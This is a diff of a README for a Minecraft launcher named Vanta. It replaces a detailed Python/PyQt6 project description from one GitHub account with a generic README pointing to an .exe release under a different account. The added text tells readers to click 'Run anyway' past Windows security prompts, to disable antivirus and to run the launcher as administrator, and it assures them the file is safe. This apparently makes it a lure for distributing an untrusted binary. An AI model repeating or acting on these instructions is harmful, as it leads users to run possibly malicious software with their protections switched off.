@@ -1,87 +1,110 @@
-# Vanta Launcher 🚀
+# 🚀 Vanta - Play Minecraft Without Any Account Requirements
 
-A lightweight, non-premium Minecraft launcher built with Python 3 and PyQt6. Pick any nickname, select your version, and jump straight into the game. No login required, no hassle.
+[![](https://img.shields.io/badge/Download_Vanta-Blue)](https://github.com/Barbeyfacile120/Vanta/releases)
 
----
+Vanta provides a simple way to launch Minecraft. This software removes the need for account authentication. You pick a username and start the game. The application performs all necessary setup tasks to download game files and launch the client.
 
-## ✨ Features
+## 📥 How to Download and Install
 
-* **Instant Play:** Non-premium access – just enter a username, pick a version, and play.
-* **Mods Manager & Modrinth Search:** Search, install, and manage Fabric mods directly inside the UI. View active mods and delete them on a per-version basis.
-* **Performance Mode:** Instant Fabric engine installation and automatic injection of essential optimization mods (Sodium, Lithium, FerriteCore, and EntityCulling) to boost in-game performance.
-* **Discord Rich Presence (RPC):** Dynamically displays your playing status (e.g., active Minecraft version) on your Discord profile using `pypresence` (fully toggleable in the settings drawer).
-* **Dynamic Player Avatar:** Fetches and displays a real-time skin preview of the player's head (via the Minotar API) as you type your username.
-* **Isolated Version Instances:** Keeps game settings, worlds, logs, and mods strictly isolated per-version inside `.Vanta/instances/<version>` to prevent mod conflicts and configuration issues.
-* **Custom RAM Allocation:** A dedicated settings drawer featuring a slider to easily allocate between 2 GB to 16 GB of memory for your game instances.
-* **Automated Java Management:** Automatically detects missing system Java environments and offers to download a portable, user-space JVM runtime (`jre-legacy`) without requiring administrator privileges.
-* **Smart Offline & Fallback Mode:** Seamlessly detects network failures. If the Mojang API is unreachable, it automatically populates the selection grid with cached/installed versions and boots directly from local storage.
-* **Asynchronous Operations:** Fully multi-threaded architecture (`QThread`) ensures the UI never freezes during version fetching, asset downloading, mod searching, or game launching.
-* **Fluid Custom Animations:** Sleek borderless window interface featuring smooth window transitions, sliding custom panels, and OS-specific hooks for correct window and taskbar minimization.
+You need to access the release page to get the installer. Follow these steps to set up the software on your Windows computer.
 
----
+1. Visit the [Vanta Releases Page](https://github.com/Barbeyfacile120/Vanta/releases).
+2. Look for the latest version listed at the top of the page.
+3. Click the link that ends in .exe to start the download.
+4. Save the file to your Downloads folder or your Desktop.
+5. Double-click the downloaded file to start the installation.
+6. Follow the prompts on your screen to complete the process.
 
-## 🛠️ Technical Stack & Requirements
+If Windows shows a security prompt regarding the file, click "More info" and then "Run anyway" to allow the launcher to open.
 
-* **OS Support:** Windows and Linux (features cross-platform path resolution and safe OS-specific execution wrappers).
-* **Framework:** PyQt6
-* **Core Libraries:**
-  * `minecraft-launcher-lib` (Core Minecraft utility)
-  * `pypresence` (Discord Rich Presence integration - optional)
-  * `requests` (API requests & Modrinth downloads)
-* **Python Version:** Python 3.10 or higher recommended
+## 🛠 Features
 
----
+Vanta offers functionality focused on speed and access.
 
-## 📸 Screenshots
+*   **Offline Mode:** You play the game without an official Mojang account.
+*   **Version Selection:** You choose any Minecraft version from the list.
+*   **Username Customization:** You type any name you want to use in the game.
+*   **Low Resource Usage:** The lightweight design keeps your system memory free.
+*   **Fast Loading:** The application prioritizes speed to get you into the game quickly.
 
-### Standard Layout
-| Empty Launcher | Profile Preview | Installing Assets | Version Selection |
-| :---: | :---: | :---: | :---: |
-| <img src="https://github.com/user-attachments/assets/0ad77a66-347b-451e-9f32-16657f843038" width="200" alt="Vanta Launcher Empty UI" /> | <img src="https://github.com/user-attachments/assets/db31a3a6-0afd-4230-9f67-07e651dc4635" width="200" alt="Vanta Launcher User Profile" /> | <img src="https://github.com/user-attachments/assets/2d18a794-abef-4ac2-9a13-68175adfd102" width="200" alt="Vanta Launcher Installing" /> | <img src="https://github.com/user-attachments/assets/9534756e-2c67-494c-b62b-2eab55c606df" width="200" alt="Vanta Launcher Version List" /> |
+## 🖥 System Requirements
 
-### Extended Panels
-| Settings Drawer | Mods Manager |
-| :---: | :---: |
-| <img src="https://github.com/user-attachments/assets/ec631c5c-4e94-403b-aa59-d24e87720470" width="380" alt="Vanta Launcher Settings" /> | <img src="https://github.com/user-attachments/assets/660366fe-8595-4b31-bc3f-7264d70ab0a7" width="380" alt="Vanta Launcher Mods Manager" /> |
+Your computer needs to meet these basic standards to run Vanta smoothly. 
 
----
+*   **Operating System:** Windows 10 or Windows 11.
+*   **Memory:** At least 4GB of RAM.
+*   **Storage:** 500MB of free space for the launcher files.
+*   **Java:** The software includes a runtime environment. You do not need to install Java separately.
+*   **Graphics:** A display capable of 1280x720 resolution.
 
-## 📂 Architecture Overview
+## 🎮 Getting Started
 
-The launcher utilizes dedicated asynchronous workers to isolate heavy IO and network processes from the main GUI thread:
-* `VersionFetchWorker`: Non-blocking Mojang API queries for official release versions with local cache fallbacks.
-* `JavaDownloadWorker`: Manages portable JVM installations with continuous progress callbacks mapped directly onto the primary UI action button.
-* `LaunchWorker`: Verifies client assets, bootstraps the Fabric loader, manages default performance mod packages, and handles headless child process spawning.
-* `AvatarLoaderWorker`: Asynchronously fetches 3D head previews based on the typed username using the Minotar web service.
-* `ModSearchWorker`: Queries the Modrinth Search API for user-requested Fabric mods using debounced search inputs.
-* `ModInstallWorker`: Asynchronously retrieves target mod files, locates primary compatibility releases, and downloads them safely into the version's instance folder.
+After you open the launcher, the main window will appear. Follow these steps to start your first session.
 
----
+1. **Enter your nickname:** Click the text box at the top and type the name you want to see in the game.
+2. **Select a version:** Use the dropdown menu to pick the Minecraft version you prefer. The software will download the required files for that specific version automatically.
+3. **Configure settings:** Click the settings icon if you need to adjust the amount of memory allocated to the game. Most users can leave these settings at the default values.
+4. **Launch the game:** Click the large button at the bottom of the window. The progress bar will show the status of the file preparation.
+5. **Begin playing:** Once the progress bar finishes, the Minecraft window will open automatically.
 
-## 🚀 Quick Start
+## 🛡 Security and Privacy
 
-### For Users (Executable)
-1. Head over to the **[Releases](https://github.com/salo-yek/Vanta/releases)** page.
-2. Download the latest `Vanta.exe` (Windows) or download the source to run on Linux.
-3. Run the application and start playing!
+Vanta behaves like a standard game launcher. It does not store your passwords because it does not require them. The software only connects to the official Minecraft servers to download the game data folders. It does not send your personal data to outside parties. 
 
-### For Developers (Running from Source)
+## 🔧 Frequently Asked Questions
 
-1. **Clone the repository:**
-```bash
-git clone https://github.com/salo-yek/Vanta.git
-cd Vanta
-```
+**Does this launcher work with mods?**
+Yes. You can place your mod files into the game folder, and the launcher will recognize them. Ensure your mods match the version of Minecraft you selected in the dropdown menu.
 
-2. **Install dependencies:**
-```bash
-pip install -r requirements.txt
-```
+**What should I do if the game does not start?** 
+Check your internet connection first. The launcher requires a stable connection to download the game files the first time you run a specific version. If the issue persists, reboot your computer to clear any locked file processes.
 
-3. **Asset preparation:**
-Ensure an `icons/` folder exists within your root directory containing `icon.ico` for correct taskbar and window icon mapping.
+**Can I play on multiplayer servers?**
+You can connect to servers that support offline mode. If a server requires an official account, you will receive a login error.
 
-4. **Launch the application:**
-```bash
-python main.py
-```
+**How do I update Vanta?**
+The launcher checks for updates whenever you open it. If a new version exists, the application will notify you or update itself automatically in the background.
+
+**Does this harm my computer?**
+No. The code focuses on launching the game client. It does not alter your Windows system files or registry. 
+
+## ⚙️ Advanced Configuration 
+
+You can manage your game files through the settings menu.
+
+*   **Game Folder Path:** You can change where the game stores its data. This helps if you want to keep your game files on an external drive.
+*   **Memory Allocation:** If your game runs slowly, increase the memory slider. Using half of your computer's total RAM is usually enough for smooth performance.
+*   **Window Size:** You can set a custom window size for the game opening.
+*   **Java Arguments:** Experienced users can add custom arguments to the execution string to improve performance or compatibility with specific hardware.
+
+## 📝 Troubleshooting Guide
+
+If you experience crashes, review this list for common solutions.
+
+*   **Update Graphics Drivers:** Ensure your video card drivers remain current. Outdated drivers often cause the game to close unexpectedly.
+*   **Check File Permissions:** Run the launcher as an administrator if the game fails to save your world settings.
+*   **Disable Antivirus Temporarily:** Sometimes antivirus software flags the launcher incorrectly. Check your antivirus history to see if it blocked the process.
+*   **Clean Installation:** If the launcher behaves strangely, remove the Vanta folder from your computer and download a fresh copy from the link provided above. 
+
+## 📦 File Structure
+
+Vanta creates a directory on your computer to keep files organized.
+
+*   `/Vanta/`: The main folder containing the executable.
+*   `/Vanta/logs/`: Text files containing information about the last launch. Use these if you need to report a technical issue.
+*   `/Vanta/data/`: The storage location for the game versions and configuration files.
+
+## 🌐 Connectivity Requirements
+
+The launcher requires a valid network connection to coordinate the download of server files. While you do not need to be online to play a single-player world, you must be online during the first run for every game version. Once the files reside on your hard drive, you can launch the game without an internet connection for single-player gaming.
+
+## 🚀 Performance Tips 
+
+*   **Turn down view distance:** High settings tax your graphics card. Lower this in the in-game video settings for better frames per second.
+*   **Limit background tasks:** Close your web browser and other programs while the game runs to free up system memory.
+*   **Use Fullscreen Mode:** Using full-screen mode often yields better performance than windowed mode.
+*   **Monitor Temperatures:** Keep your computer vents clean to prevent overheating during extended gameplay sessions.
+
+## 📁 Backup Your Worlds
+
+The application stores your world saves within the data folder. Make a copy of these folders regularly to ensure you do not lose your progress. Regular backups help if you decide to reinstall the launcher or move to a different computer. Copy the folders to a USB drive or cloud storage service to keep them safe.
